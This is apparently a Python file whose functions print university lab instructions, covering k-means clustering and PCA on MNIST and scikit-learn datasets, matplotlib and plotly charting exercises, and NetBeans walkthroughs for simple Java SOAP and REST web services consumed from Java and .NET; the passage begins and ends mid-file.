    for i, cluster in enumerate(X_labels):
        for key, value in cluster_labels.items():
            if cluster in value:
                predicted_labels[i] = key
                
    return predicted_labels




# test the infer_cluster_labels() and infer_data_labels() functions
cluster_labels = infer_cluster_labels(kmeans, Y)
X_clusters = kmeans.predict(X)
predicted_labels = infer_data_labels(X_clusters, cluster_labels)
print (predicted_labels[:20])
print (Y[:20])




Optimizing and Evaluating the Clustering Algorithm

from sklearn import metrics

def calculate_metrics(estimator, data, labels):

    # Calculate and print metrics
    print('Number of Clusters: {}'.format(estimator.n_clusters))
    print('Inertia: {}'.format(estimator.inertia_))
    print('Homogeneity: {}'.format(metrics.homogeneity_score(labels, estimator.labels_)))



clusters = [10, 16, 36, 64, 144, 256]

# test different numbers of clusters
for n_clusters in clusters:
    estimator = MiniBatchKMeans(n_clusters = n_clusters)
    estimator.fit(X)
    
    # print cluster metrics
    calculate_metrics(estimator, X, Y)
    
    # determine predicted labels
    cluster_labels = infer_cluster_labels(estimator, Y)
    predicted_Y = infer_data_labels(estimator.labels_, cluster_labels)
    
    # calculate and print accuracy
    print('Accuracy: {}\n'.format(metrics.accuracy_score(Y, predicted_Y)))




# test kmeans algorithm on testing dataset
# convert each image to 1 dimensional array
X_test = x_test.reshape(len(x_test),-1)

# normalize the data to 0 - 1
X_test = X_test.astype(float) / 255.

# initialize and fit KMeans algorithm on training data
kmeans = MiniBatchKMeans(n_clusters = 256)
kmeans.fit(X)
cluster_labels = infer_cluster_labels(kmeans, Y)

# predict labels for testing data
test_clusters = kmeans.predict(X_test)
predicted_labels = infer_data_labels(kmeans.predict(X_test), cluster_labels)
    
# calculate and print accuracy
print('Accuracy: {}\n'.format(metrics.accuracy_score(y_test, predicted_labels)))




Visualizing Cluster Centroids




# Initialize and fit KMeans algorithm
kmeans = MiniBatchKMeans(n_clusters = 36)
kmeans.fit(X)

# record centroid values
centroids = kmeans.cluster_centers_

# reshape centroids into images
images = centroids.reshape(36, 28, 28)
images *= 255
images = images.astype(np.uint8)

# determine cluster labels
cluster_labels = infer_cluster_labels(kmeans, Y)

# create figure with subplots using matplotlib.pyplot
fig, axs = plt.subplots(6, 6, figsize = (20, 20))
plt.gray()

# loop through subplots and add centroid images
for i, ax in enumerate(axs.flat):
    
    # determine inferred label using cluster_labels dictionary
    for key, value in cluster_labels.items():
        if i in value:
            ax.set_title('Inferred Label: {}'.format(key))
    
    # add image to subplot
    ax.matshow(images[i])
    ax.axis('off')
    
# display the figure
fig.show()





from sklearn.manifold import TSNE

# Perform t-SNE dimensionality reduction
tsne = TSNE(n_components=2, random_state=42)
X_tsne = tsne.fit_transform(X)

# Create a scatter plot to visualize the clustering results
plt.figure(figsize=(10, 8))
plt.scatter(X_tsne[:, 0], X_tsne[:, 1], c=X_clusters, cmap='viridis', s=20, alpha=0.5)
plt.scatter(kmeans.cluster_centers_[:, 0], kmeans.cluster_centers_[:, 1], marker='x', s=100, c='red', label='Cluster Centers')
plt.title('t-SNE Visualization of K-means Clustering Results (MNIST Data)')
plt.xlabel('t-SNE Dimension 1')
plt.ylabel('t-SNE Dimension 2')
plt.legend()
plt.colorbar(label='Cluster')
plt.show()










KMeans
import sys
import sklearn
import matplotlib
import numpy as np
from sklearn.cluster import KMeans
from sklearn.metrics import silhouette_score

print('Python: {}'.format(sys.version))
print('Sklearn: {}'.format(sklearn.__version__))
print('Matplotlib: {}'.format(matplotlib.__version__))
print('NumPy: {}'.format(np.__version__))



from keras.datasets import mnist
import matplotlib.pyplot as plt
from sklearn.manifold import TSNE

# Load the MNIST dataset
(x_train, y_train), (x_test, y_test) = mnist.load_data()

# Preprocessing the images
X = x_train.reshape(len(x_train), -1).astype(float) / 255.



def plot_elbow_method(X):
    inertia_values = []
    clusters_range = range(2, 21)
    
    for n_clusters in clusters_range:
        kmeans = KMeans(n_clusters=n_clusters, random_state=42, n_init=10)  # Explicitly set n_init
        kmeans.fit(X)
        inertia_values.append(kmeans.inertia_)

    plt.figure(figsize=(10, 6))
    plt.plot(clusters_range, inertia_values, marker='o', linestyle='-')
    plt.xlabel('Number of Clusters')
    plt.ylabel('Inertia')
    plt.title('Elbow Method for Optimal K')
    plt.show()



def plot_silhouette_analysis(X):
    silhouette_scores = []
    clusters_range = range(2, 21)
    
    for n_clusters in clusters_range:
        kmeans = KMeans(n_clusters=n_clusters, random_state=42, n_init=10)  # Explicitly set n_init
        cluster_labels = kmeans.fit_predict(X)
        silhouette_avg = silhouette_score(X, cluster_labels)
        silhouette_scores.append(silhouette_avg)

    plt.figure(figsize=(10, 6))
    plt.plot(clusters_range, silhouette_scores, marker='o', linestyle='-')
    plt.xlabel('Number of Clusters')
    plt.ylabel('Silhouette Score')
    plt.title('Silhouette Analysis for Optimal K')
    plt.show()



def visualize_clusters(X, y, n_clusters):
    kmeans = KMeans(n_clusters=n_clusters, random_state=42, n_init=10)  # Explicitly set n_init
    kmeans.fit(X)
    cluster_labels = kmeans.predict(X)
    
    # Perform t-SNE dimensionality reduction
    tsne = TSNE(n_components=2, random_state=42)
    X_tsne = tsne.fit_transform(X)

    # Create a scatter plot to visualize the clustering results
    plt.figure(figsize=(10, 8))
    plt.scatter(X_tsne[:, 0], X_tsne[:, 1], c=cluster_labels, cmap='viridis', s=20, alpha=0.5)
    plt.scatter(kmeans.cluster_centers_[:, 0], kmeans.cluster_centers_[:, 1], marker='x', s=100, c='red', label='Cluster Centers')
    plt.title('t-SNE Visualization of K-means Clustering Results (MNIST Data)')
    plt.xlabel('t-SNE Dimension 1')
    plt.ylabel('t-SNE Dimension 2')
    plt.legend()
    plt.colorbar(label='Cluster')
    plt.show()




# Plot the elbow method for optimal number of clusters
plot_elbow_method(X)



# Plot the silhouette analysis for optimal number of clusters
plot_silhouette_analysis(X)







# Visualize clustering results with the optimal number of clusters
optimal_n_clusters = 10
visualize_clusters(X, y_train, optimal_n_clusters)
    """
        )



def PCADesc():
    print(
    """
Principal Component Analysis (PCA)
 Perform PCA on a dataset to reduce dimensionality.
 Evaluate the explained variance and select the appropriate number of principal
components.
 Visualize the data in the reduced-dimensional space.
    """
        )

def PCA():
    print(
    """
Practical 9

PCA

Principal Component Analysis (PCA)
 Perform PCA on a dataset to reduce dimensionality.
 Evaluate the explained variance and select the appropriate number of principal
components.
 Visualize the data in the reduced-dimensional space.


Problem: 
Given a set of features, you want to reduce the number of features while retaining the variance in the data. 
Solution: 
Use principal component analysis with scikit's PCA


# Load libraries 
from sklearn.preprocessing import StandardScaler 
from sklearn.decomposition import PCA 
from sklearn import datasets


# Load the data 
digits = datasets.load_digits()


# Standardize the feature matrix 
X = StandardScaler().fit_transform(digits.data) 


# Create a PCA that will retain 99% of the variance  
PCAVAL = PCA(n_components=0.99, whiten=True) 
# Conduct PCA 
X_pca = PCAVAL.fit_transform(X)



# Show results 
print('Original number of features: ', X.shape[1]) 
print('Reduced number of features:', X_pca.shape[1])


Problem:
You suspect you have linearly inseparable data and want to reduce the dimensions. 
Solution:
Use an extension of principal component analysis that uses kernels to allow for non-linear dimensionality reduction



# Load libraries 
from sklearn. decomposition import PCA, KernelPCA 
from sklearn.datasets import make_circles





# Create linearly inseparable data 
X,_ = make_circles (n_samples=1000, random_state=1, noise=0.1, factor=0.1)



# Apply kernal PCA with radius basis function (RBF) kernel 
kpca = KernelPCA (kernel="rbf", gamma=15, n_components=1) 
Х_kрса = kpca.fit_transform (X) 



print('Original number of features:', X.shape[1]) 
print('Reduced number of features:', Х_kрса.shape[1])





###Kernel PCA 
In our solution 
we used scikit-learn's make_circles to generate a simulated dataset with a target vector of two classes and two features. make_circles makes linearly inseparable data; specifically, one class is surrounded on all sides by the other class.
Reducing Features by Maximizing Class Separability Problem 
You want to reduce the features to be used by a classifier. 
Solution 
Try linear discriminant analysis (LDA) to project the features onto component axes that maximize the separation of classes






# Load libraries 
from sklearn import datasets 
from sklearn.discriminant_analysis import LinearDiscriminantAnalysis





# Load the Iris flower dataset: 
iris = datasets.load_iris () 
X = iris.data
y = iris.target



# Create an LDA that will reduce the data down to 1 feature 
lda = LinearDiscriminantAnalysis(n_components=1)



# run an LDA and use it to transform the features 
X_lda = lda.fit(X, y).transform (X)



#Print the number of features 
print('Original number of features:', X.shape[1]) 
print('Reduced number of features:', X_lda.shape[1])




We can use explained_variance_ratio_ to view the amount of variance explained by each com- ponent. In our solution the single component explained over 99% of the variance




## View the ratio of explained variance 
lda.explained_variance_ratio_







Problem: 
You have a set of numerical features and want to remove those with low variance (i.e., likely containing little information). 
Solution: 
Select a subset of features with variances above a given threshold: 
Principle: Low variance features contains less information 
Calculate variance of each features and then drop the features with low variance 
Features should be in same scale



##Thresholding Numerical Feature Variance 
from sklearn import datasets 
from sklearn. feature_selection import VarianceThreshold 




# Load iris data 
iris = datasets.load_iris() 


# Create features and target 
X = iris.data 
y = iris.target


# Create VarianceThreshold object with a variance with a threshold of 0.5 
thresholder = VarianceThreshold (threshold=.5)


# Conduct variance thresholding 
X_high_variance = thresholder.fit_transform(X)




# View first five rows with features with variances above threshold 
X_high_variance[0:5]




#We can see the variance for each feature using variances_: 
# View variances 
thresholder.fit(X).variances_





##Handling Highly Correlated Features Problem 
You have a feature matrix and suspect some features are highly correlated. 
Solution 
Use a correlation matrix to check for highly correlated features. 
If highly correlated features exist, consider dropping one of the correlated features: 




# Load libraries 
import pandas as pd 
import numpy as np




# Create feature matrix with two highly correlated features 
X = np.array([[1, 1, 1], 
[2, 2, 0], 
[3, 3, 1], 
[4, 4, 0], 
[5, 5, 1], 
[6, 6, 0], 
[7, 7, 1], 
[8, 7, 0], 
[9, 7, 1]])




# Convert feature matrix into DataFrame 
df = pd.DataFrame(X)



#View the dataframe
df



#Identify Highly Correlated Features and drop 1
# Create correlation matrix 
corr_matrix = df.corr().abs()



# Select upper triangle of correlation matrix 
upper = corr_matrix.where(np.triu (np.ones (corr_matrix.shape), k=1).astype (np.bool_))



# Find index of feature columns with correlation greater than 0.95
to_drop =[column for column in upper.columns if any (upper[column] > 0.95)]



# Drop features 
df.drop(df[to_drop], axis=1)



# Correlation matrix 
df.corr()


Second, we look at the upper triangle of the correlation matrix to identify pairs of highly correlated features
# Upper triangle of correlation matrix 
upper




Third, we remove one feature from each of those pairs from the feature set.


# Drop features 
df.drop(df[to_drop], axis=1)



##Removing Irrelevant Features for Classification 
Problem 
You have a categorical target vector and want to remove uninformative features. 
###chi-square (x2) chi-square (x2): If the features are categorical, calculate a chi- square (x2) statistic between each feature and the target vector.



# Load libraries 
from sklearn.datasets import load_iris 
from sklearn.feature_selection import SelectKBest 
from sklearn.feature_selection import chi2 



# Load iris data 
iris = load_iris()  
# Create features and target 
X = iris.data 
y = iris.target



# Convert to categorical data by converting data to integers 
X = X.astype(int)



# Select two features with highest chi-squared statistics 
chi2_selector = SelectKBest (chi2, k=2) 
X_kbest = chi2_selector.fit_transform(X, y)



# Show results 
print('Original number of features:', X.shape[1]) 
print('Reduced number of features:', X_kbest.shape[1]) 



###ANOVA F-value If the features are quantitative, compute the ANOVA F-value between each feature and the target vector.



# Load libraries 
from sklearn.datasets import load_iris 
from sklearn.feature_selection import SelectKBest 
from sklearn.feature_selection import f_classif 
# Load iris data 
iris = load_iris() 



# Create features and target 
X = iris.data 
y = iris.target



# Create an SelectKBest object to select features with two best ANOVA F-Values 
fvalue_selector = SelectKBest (f_classif, k=2)




# Apply the SelectKBest object to the features and target 
X_kbest = fvalue_selector.fit_transform(X, y)




# Show results 
print('Original number of features: ', X.shape[1]) 
print('Reduced number of features:', X_kbest.shape[1])
    """
        )


def VisulaizeDesc():
    print(
    """
Aim: Data Visualization and Storytelling
    """
        )


def Visualize():
    print(
    """
Practical 10


Aim: Data Visualization and Storytelling


•	Create meaningful visualizations using data visualization tools
•	Combine multiple visualizations to tell a compelling data story.
•	Present the findings and insights in a clear and concise manner.


Creating a Bar Chart for generated data
import pandas as pd
import matplotlib.pyplot as plt
data = [5., 25., 50., 20.]
plt.bar(range(len(data)), data)
plt.show()



Plotting the Bar Chart in histogram format
data = [5., 25., 50., 20.]
plt.bar(range(len(data)), data, width=1.)
plt.show()




import pandas as pd
import matplotlib.pyplot as plt
data = [5., 25., 50., 20.]
plt.barh(range(len(data)), data)
plt.show()


import numpy as np
data = [[5., 25., 50., 20.],
        [4., 23., 51., 17.],
        [6., 22., 52., 19.]]
x = np.arange(4)
plt.bar(x + 0.00, data[0], color='b', width=0.25)
plt.bar(x + 0.25, data[1], color='r', width=0.25)
plt.bar(x + 0.50, data[2], color='g', width=0.25)
plt.show()



a = [5., 30., 45., 22.]
b = [5., 25., 50., 20.]
x = range(4)
plt.bar(x, a, color='b')
plt.bar(x, b, color='r', bottom=a)
plt.show()



Creating a Box Plot from CSV data
import pandas as pd
data = pd.read_csv("https://raw.githubusercontent.com/amankharwal/Website-data/master/Advertising.csv")
print(data.head())



import plotly.express as px
fig = px.box(data, y="TV")
fig.show()



Creating a Box Plot from CSV data
import pandas as pd
import matplotlib.pyplot as plt
data = pd.read_csv("./Twitter.csv", encoding="latin-1")
print(data.head())



import plotly.express as px
fig = px.box(data, y="followers_count")
fig.show()



Creating a HeatMap from a CSV data file
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
movies = pd.read_csv("./MoviesOnStreamingPlatforms.csv")
movies.head()



# Replace the column names and data preprocessing according to your dataset
# Extract the numerical part of the 'Rotten Tomatoes' column
movies['Rotten Tomatoes'] = movies["Rotten Tomatoes"].str.split('/').str[0].astype(float)

# Drop non-numeric columns
movies_numeric = movies.select_dtypes(include=['float64', 'int64'])

# Drop the 'Type' column if it exists
if 'Type' in movies_numeric.columns:
    movies_numeric.drop("Type", inplace=True, axis=1)

# Calculate correlations
correlations = movies_numeric.corr(method='pearson')

# Plotting
sns.heatmap(correlations, cmap="coolwarm", annot=False, fmt=".2f")
plt.title('Correlation Heatmap')
plt.show()



# Plotting
sns.heatmap(correlations, cmap="coolwarm", annot=True, fmt=".2f")
plt.title('Correlation Heatmap')
plt.show()




Creating a HeatMap from a CSV data file
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
twitter = pd.read_csv("./Twitter.csv")
twitter.head()




# Drop non-numeric columns
data_numeric = twitter.select_dtypes(include=['float64', 'int64'])

# Calculate correlations
correlations = data_numeric.corr(method='pearson')



# Plotting
sns.heatmap(correlations, cmap="coolwarm", annot=False, fmt=".2f")
plt.title('Correlation Heatmap')
plt.show()

# Optionally,  display correlation values on the heatmap by setting annot=True
sns.heatmap(correlations, cmap="coolwarm", annot=True, fmt=".2f")
plt.title('Correlation Heatmap with Annotations')
plt.show()




Plotting a Histogram Density Graph in various shapes
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
sns.set()

data = np.random.multivariate_normal([0, 0], [[5, 2], [2, 2]], size=2000)
data = pd.DataFrame(data, columns=['x', 'y'])
plt.hist(data["x"], alpha=0.5)
plt.hist(data["y"], alpha=0.5)
plt.show()




import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
sns.set()

data = np.random.multivariate_normal([0, 0], [[5, 2], [2, 2]], size=2000)
data = pd.DataFrame(data, columns=['x', 'y'])
sns.kdeplot(data["x"], shade=True)
sns.kdeplot(data["y"], shade=True)
plt.show()



import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
sns.set()

data = np.random.multivariate_normal([0, 0], [[5, 2], [2, 2]], size=2000)
data = pd.DataFrame(data, columns=['x', 'y'])
sns.distplot(data['x'])
sns.distplot(data['y'])
plt.show()




Plotting a Line Plot graph for the given CSV file
import pandas as pd
import matplotlib.pyplot as plt
data = pd.read_csv("./Twitter.csv", encoding="latin-1")
print(data.head())



# Creating a Line Plot
plt.plot(data["followers_count"], "-r", label="Followers Count")
plt.plot(data["statuses_count"], "-g", label="Statuses Count")
plt.plot(data["friends_count"], "-b", label="Friends Count")

plt.grid(True)  # Add grid
plt.show()  # Show the plot



# Customizing Figure Size
plt.figure(figsize=(15, 10)) # Customizing Figure Size
plt.plot(data["followers_count"], "-r", label="Followers Count")
plt.plot(data["statuses_count"], "-g", label="Statuses Count")
plt.plot(data["friends_count"], "-b", label="Friends Count")

plt.grid(True)  # Add grid
plt.show()  # Show the plot



# Customizing Themes
plt.style.use('fivethirtyeight') # for customizing theme
plt.figure(figsize=(15, 10)) # Customizing Figure Size
plt.plot(data["followers_count"], "-r", label="Followers Count")
plt.plot(data["statuses_count"], "-g", label="Statuses Count")
plt.plot(data["friends_count"], "-b", label="Friends Count")

plt.grid(True)  # Add grid
plt.show()  # Show the plot


# Add Title
plt.style.use('fivethirtyeight') # for customizing theme
plt.figure(figsize=(15, 10)) # Customizing Figure Size
plt.plot(data["followers_count"], "-r", label="Followers Count")
plt.plot(data["statuses_count"], "-g", label="Statuses Count")
plt.plot(data["friends_count"], "-b", label="Friends Count")
plt.title("Twitter Data")  # Add Title of the plot
plt.grid(True)  # Add grid
plt.show()  # Show the plot



# Adding Labels on xaxis and yaxis
plt.style.use('fivethirtyeight') # for customizing theme
plt.figure(figsize=(15, 10)) # Customizing Figure Size
plt.plot(data["followers_count"], "-r", label="Followers Count")
plt.plot(data["statuses_count"], "-g", label="Statuses Count")
plt.plot(data["friends_count"], "-b", label="Friends Count")
plt.title("Twitter Data")  # Add Title of the plot
plt.xlabel("Index")  # Label for x-axis
plt.ylabel("Counts")  # Label for y-axis
plt.grid(True)  # Add grid
plt.show()  # Show the plot




# Adding Legend
plt.style.use('fivethirtyeight') # for customizing theme
plt.figure(figsize=(15, 10)) # Customizing Figure Size
plt.plot(data["followers_count"], "-r", label="Followers Count")
plt.plot(data["statuses_count"], "-g", label="Statuses Count")
plt.plot(data["friends_count"], "-b", label="Friends Count")
plt.title("Twitter Data")  # Add Title of the plot
plt.xlabel("Index")  # Label for x-axis
plt.ylabel("Counts")  # Label for y-axis
plt.legend()  # Add legend
plt.grid(True)  # Add grid
plt.show()  # Show the plot





Plotting a Pie Chart for generated data
import matplotlib.pyplot as plt
data = [20, 50, 30, 60]
plt.pie(data)
plt.show()



Plotting a Pie Chart from JSON dataset file
import pandas as pd
df = pd.read_json("./datanew.json")
group_size = [sum(df.positive), sum(df.active), sum(df.cured)]
group_labels = ["Positive\n"+str(sum(df.positive)),
                "Active\n"+str(sum(df.active)),
                "Cured\n"+str(sum(df.cured))]
custom_colors = ["skyblue", "yellowgreen", 'tomato']
plt.figure(figsize=(5, 5))
plt.pie(group_size, labels=group_labels, colors=custom_colors)
plt.rc('font', size=12)
plt.title("Total Positive, Active, and Cured Cases", fontsize=20)
plt.show()



Plotting Pie Chart with top 5 states for highest cases
df.drop(df.tail(1).index, inplace = True) 
df1 = df.sort_values(by='active', ascending=False)
df3 = df1[:5]
states = df3.state_name
active = df3.active
colours = ["skyblue", "blue", "purple", "yellow", "red"]
plt.figure(figsize=(7,7))
plt.pie(active, labels=states, colors=colours)
plt.rc('font', size=12)
plt.title("Top 5 Active cases", fontsize=20)
plt.show()



Plotting a Pie Chart for generated data
import matplotlib.pyplot as plt
data = [20, 50, 30, 60]
plt.pie(data)
plt.show()



Plotting a Pie Chart from CSV dataset file
import pandas as pd
# Load the dataset from CSV file
df = pd.read_csv("./Twitter.csv")

# Calculate the sum of followers_count, statuses_count, and friends_count for the first few entries
group_size = [df['followers_count'].iloc[:5].sum(),
              df['statuses_count'].iloc[:5].sum(),
              df['friends_count'].iloc[:5].sum()]

group_labels = ["Followers",
                "Statuses",
                "Friends"]

custom_colors = ["skyblue", "yellowgreen", 'tomato']

plt.figure(figsize=(8, 6))
plt.pie(group_size, labels=None, colors=custom_colors, autopct='%1.1f%%', startangle=140, textprops={'fontsize': 12})
plt.axis('equal')
plt.title("Total Followers, Statuses, and Friends for First 5 Entries", fontsize=16)
plt.legend(group_labels, loc="best", fontsize=12)
plt.tight_layout()
plt.show()



Plotting a Pie Chart for Top 5 followed accounts
df_top5 = df.nlargest(5, 'followers_count')

# Extracting the required data
screen_names = df_top5['screen_name']
followers_count = df_top5['followers_count']

# Define colors for the pie chart
colors = ["skyblue", "blue", "purple", "yellow", "red"]

# Plotting the pie chart
plt.figure(figsize=(7, 7))
plt.pie(followers_count, labels=screen_names, colors=colors, autopct='%1.1f%%', startangle=140)
plt.title("Top 5 Twitter Accounts by Followers Count", fontsize=16)
plt.axis('equal')  # Equal aspect ratio ensures that pie is drawn as a circle.
plt.show()



Plotting a Scatter Plot for generated data
import numpy as np
import matplotlib.pyplot as plt
rng = np.random.RandomState(0)
x = rng.randn(100)
y = rng.randn(100)
colors = rng.rand(100)
sizes = 1000 * rng.rand(100)

plt.scatter(x, y, c=colors, s=sizes, alpha=0.3,
            cmap='viridis')
plt.colorbar()
plt.show()



Plotting a Scatter Plot from CSV data file
import pandas as pd
housing = pd.read_csv("https://raw.githubusercontent.com/ageron/handson-ml/master/datasets/housing/housing.csv")
housing.plot(kind='scatter', x='longitude', y='latitude', alpha=0.4, s=housing['population']/100, label='population',
figsize=(12, 8), c='median_house_value', cmap=plt.get_cmap('jet'), colorbar=True)
plt.legend()
plt.show()



Plotting a Scatter Plot for generated data
import numpy as np
import matplotlib.pyplot as plt
rng = np.random.RandomState(0)
x = rng.randn(100)
y = rng.randn(100)
colors = rng.rand(100)
sizes = 1000 * rng.rand(100)

plt.scatter(x, y, c=colors, s=sizes, alpha=0.3,
            cmap='viridis')
plt.colorbar()
plt.show()



Plotting a Scatter Plot from CSV data file
import pandas as pd
# Load the dataset
df = pd.read_csv("./Twitter.csv")

# Select the numerical columns for the scatter plot
followers_count = df['followers_count']
statuses_count = df['statuses_count']


# Plotting the scatter plot
plt.figure(figsize=(10, 6))
plt.scatter(followers_count, statuses_count, color='skyblue', alpha=0.5)
plt.title('Scatter Plot of Followers Count vs. Statuses Count')
plt.xlabel('Followers Count')
plt.ylabel('Statuses Count')
plt.grid(True)
plt.show()


# Plotting the scatter plot with coloring based on followers_count
plt.figure(figsize=(10, 6))
plt.scatter(df.index, df['followers_count'], alpha=0.4, s=df['statuses_count']/100, label='statuses_count',
            c=df['followers_count'], cmap=plt.get_cmap('jet'))
plt.colorbar(label='Followers Count')
plt.xlabel('Index')
plt.ylabel('Followers Count')
plt.title('Scatter Plot with Color by Followers Count')
plt.legend()
plt.grid(True)
plt.show()




Creating a time series graph using the yahoo finance library to get data and plot using plotly library
import pandas as pd
import yfinance as yf
import datetime
from datetime import date, timedelta
today = date.today()

d1 = today.strftime("%Y-%m-%d")
end_date = d1
d2 = date.today() - timedelta(days=360)
d2 = d2.strftime("%Y-%m-%d")
start_date = d2

data = yf.download('AAPL', 
                      start=start_date, 
                      end=end_date, 
                      progress=False)
print(data.head())




import plotly.express as px
figure = px.line(data, x = data.index, y = "Close")
figure.show()



Creating a tree map for generated data
import plotly.graph_objects as go

fig = go.Figure(go.Treemap(
    labels = ["A","B", "C", "D", "E", "F", "G", "H", "I"],
    parents = ["", "A", "A", "C", "C", "A", "A", "G", "A"]
))

fig.show()



# Sample data for the treemap
labels = ["A", "B", "C", "D", "E", "F", "G", "H", "I"]
parents = ["", "A", "A", "C", "C", "A", "A", "G", "A"]
values = [100, 50, 25, 30, 20, 10, 15, 5, 8]  # Values for each node



# Create the treemap figure
fig = go.Figure(go.Treemap(
    labels=labels,
    parents=parents,
    values=values,
))

# Show the treemap
fig.show()
    """
        )


def SimservDesc():
    print(
    """
Define a simple services like Converting Rs into Dollar and Call it from different
platform like JAVA and .NET
    """
        )

def Simserv():
    print(
    """
Practical 1

Open netbeans
Click on new project->Java Web Application->Next
Name the Application as anything(Practical 1)
Select Location->Next

Select GlassFish Server 4.1
Java EE Version: Java EE 7 Web
Click on Next->Do not select anything and finish

You will get index.html with boilerplate code
Click on new->Web Service
Name the web service as CurrencyConverter and select package as server
Click on finish

You will get CurrencyConverter.java
Remove the hello returning part and right click on insert code or alt+insert
Add web service operation
Put operation name as InrtoDollar and return type as java.lang.string
Put parameter list a variable a and type as double


instead of it's return null statement replace it with:
return "The Indian Rupees "+a+" in Dollars is: "+(a/83.17);

Click on project->Deploy

Click on Web services->CurrencyConverter->Test web service

It will open tester in edge browser, enter value and test the web service


Create a new JSP file and name it input:
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Page(Input)</title>
    </head>
    <body>
        <form action="output.jsp">
            <pre>
            Enter Indian Rupees to Convert: <input type="text" name="t1">
            <input  type="submit"><input type="reset">
            
        </form>>
    </body>
</html>



Create another new JSP file and name it output:
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Page</title>
    </head>
    <body>
        
        <%
        try{
        Client.CurrencyConverter_Service service = new Client.CurrencyConverter_Service();
        Client.CurrencyConverter port = service.getCurrencyConverterPort();
        
        double a = Double.parseDouble(request.getParameter("t1"));
        
        java.lang.String result = port.inrtoDollar(a);
        out.println(result);
            }catch(Exception ex){
            
            }
        %>
        
    </body>
</html>





Click on new->Web service Client
Select the created CurrencyConverter
Select project as the location of the localhost file by browsing if needed
select package and client



Now select project and click deploy

Run input.jsp

And enter values and check













Practical 1b
Creating Web Service in Java and Consuming in .Net


Open netbeans
Click on new project->Web Application->Next
Name the Application as anything(Practical 1)
Select Location->Next

Select GlassFish Server 4.1
Java EE Version: Java EE 7 Web
Click on Next->Do not select anything and finish


Click on new->Web service
Name the service as CurrencyConverter and select package as server and finish



Remove hello returning code and right click insert code or alt+insert
Add web service operation
Put operation name as InrtoDollar and return type as java.lang.string
Put parameter list a variable a and type as double


instead of it's return null statement replace it with:
return "The Indian Rupees "+a+" in Dollars is: "+(a/83.17);

Project->Deploy


Click on web service-> currencyconverter-> test web service
Enter values and test



Open visual studio
Create new project->Console App(.NET framework(A project for creating a command-line application))


Select .NET framework 4.7.2


Name it currency and create


In solution explorer right click->Add->Reference

Select: System.ServiceModel, System.Xml, System.Xml.Linq

In solution explorer right click->Add->Service Reference
It will open a window to select the service reference



Go back to netbeans
New->Web service client for the currencyconverter
copy the project location


Paste the copied location in the serivce reference address of visual studio


Name the namespace as anything you want



and remove the main method with:
 static void Main(string[] args)
        {
            CurrencyConverterClient client = new CurrencyConverterClient();
            Console.WriteLine("Enter the currency in Indian Rupees: ");
            double d = double.Parse(Console.ReadLine());
            Console.WriteLine(client.InrtoDollar(d));
            Console.ReadKey(); // Wait for user to press any key before exiting
        }
    """
        )


def RestservDesc():
    print(
    """
Create a Simple REST Service
    """
        )


def Restserv():
    print(
    """
Practical 2a:
Aim: 

Create a Simple REST Service.


Open netbeans
Click on new project->Web Application->Next
Name the Application as anything(Restful service)
Select Location->Next

Select GlassFish Server 4.1
Java EE Version: Java EE 7 Web
Click on Next->Do not select anything and finish



Click on New -> RESTful Web Services from Patterns

Select simple root resource->Next

Select MIME type as text/html and resource package as StringOperationPackage and Classname as StringOperations




StringOperations.java file will be created

There will be GET and PUT methods in it

And in it code should be:


/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package StringOperationPackage;

import javax.ws.rs.core.Context;
import javax.ws.rs.core.UriInfo;
import javax.ws.rs.PathParam;
import javax.ws.rs.Produces;
import javax.ws.rs.Consumes;
import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.PUT;

/**
 * REST Web Service
 *
 * @author 91885
 */
@Path("generic")
public class StringOperations {

    @Context
    private UriInfo context;

    /**
     * Creates a new instance of StringOperations
     */
    public StringOperations() {
    }

    /**
     * Retrieves representation of an instance of StringOperationPackage.StringOperations
     * @return an instance of java.lang.String
     */
    @PUT
    @Consumes("text/html")
    public void putHtml(String context){
    }
    
    @PUT
    @Consumes("text/html")
    @Path("/Uppercase")
    public String toUpperCaseMethod(String str)
    {
        return str.toUpperCase();
    }
    
    @PUT
    @Consumes("text/html")
    @Path("/Lowercase")
    public String toLowercaseMethod(String str)
    {
        return str.toLowerCase();
    }
}





Click on project->Clean
Project->Deploy


Click on web service-> test restful web services


Click on web test client in project-> OK


And test the web service


































Practical 2b:


Create a Simple REST Service.


Open netbeans
Click on new project->Web Application->Next
Name the Application as anything(Restful service)
Select Location->Next

Select GlassFish Server 4.1
Java EE Version: Java EE 7 Web
Click on Next->Do not select anything and finish



Click on New -> RESTful Web Services from Patterns

Select simple root resource->Next

Select MIME type as text/html and resource package as StringOperationPackage and Classname as StringOperations

StringOperations.java:
/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package StringOperationPackage;

import javax.ws.rs.core.Context;
import javax.ws.rs.core.UriInfo;
import javax.ws.rs.PathParam;
import javax.ws.rs.Produces;
import javax.ws.rs.Consumes;
import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.PUT;

/**
 * REST Web Service
 *
 * @author 91885
 */
@Path("generic")
public class StringOperations {

    @Context
    private UriInfo context;

    /**
     * Creates a new instance of StringOperations
     */
    public StringOperations() {
    }

    /**
     * Retrieves representation of an instance of StringOperationPackage.StringOperations
     * @return an instance of java.lang.String
     */
    @PUT
    @Consumes("text/html")
    public void putHtml(String context){
    }
    
    @PUT
    @Consumes("text/html")
    @Path("/Uppercase")
    public String toUpperCaseMethod(String str)
    {
        return str.toUpperCase();
    }
    
    @PUT
    @Consumes("text/html")
    @Path("/Lowercase")
    public String toLowercaseMethod(String str)
    {
        return str.toLowerCase();
    }
}


Right click on project->clean and then Right click deploy

Right click on the web service package and Test RESTful Web Services

Click on web test client in project-> OK


And test the web service

(B) Consuming Restful Service

Create a new project-> java application
name it RestfulClient

Right click on the client -> new-> other-> web services-> RESTful Java client

Name it as StringOperationClient
Select Package name as StringPackage

Select the REST resource as the REST web service made(Restful service(StringOperations))

RestfulClient.java:

